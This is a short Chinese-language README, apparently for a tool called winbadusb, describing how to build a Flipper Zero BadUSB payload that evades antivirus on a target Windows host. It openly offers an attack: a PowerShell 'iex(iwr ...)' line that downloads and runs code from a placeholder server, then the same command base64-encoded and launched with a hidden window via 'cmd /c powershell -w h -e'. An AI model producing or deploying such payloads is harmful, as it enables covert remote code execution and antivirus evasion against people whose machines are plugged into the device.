# winbadusb
一种绕过杀软加载执行远程powershell命令的badusb制作方法

```
badusb载荷制作

想为flipper zero制作badusb在目标主机执行，但是直接写入powershell命令输入时间太长，vbs无窗口加载power在执行vbs以前就已经报毒了，偶然间刷到毛子的复制文字以通过人机验证的恶意攻击，现整理毛子攻击思路如下：
该脚本用于将明文转换为小头utf16编码以绕过杀软
有效的载荷是这样的：
将你的powershell代码上传到服务器如： https://localhost.com/a.html
将这段明文通过本脚本生成base64编码： iex(iwr -Uri 'https://localhost.com/a.html')
将生成的base64编码制作成如下badusb： cmd /c "powershell -w h -e aQBlAHgAKABpAHcAcgAgAC0AVQByAGkAIAAnAGgAdAB0AHAAcwA6AC8ALwBsAG8AYwBhAGwAaABvAHMAdAAuAGMAbwBtAC8AYQAuAGgAdABtAGwAJwApAA=="
```
